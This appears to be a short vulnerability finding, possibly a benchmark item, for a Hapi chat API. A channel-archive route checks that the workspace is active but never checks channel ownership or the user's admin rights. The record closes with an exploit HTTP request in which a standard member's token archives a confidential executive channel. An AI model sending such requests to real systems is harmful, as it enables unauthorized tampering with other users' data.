diagnosis: The channel archival route in Hapi verifies that the workspace in the URL is active during onPreHandler, but the handler executes Prisma update on channelId directly without verifying that the channel belongs to that workspace or that the user has administrative rights in that workspace.
exploit_request:
POST /api/workspaces/ws_standard_team/channels/chn_exec_confidential/archive HTTP/1.1
Host: chat.enterprise.net:4400
Authorization: Bearer <standard_member_jwt>
Accept: application/json
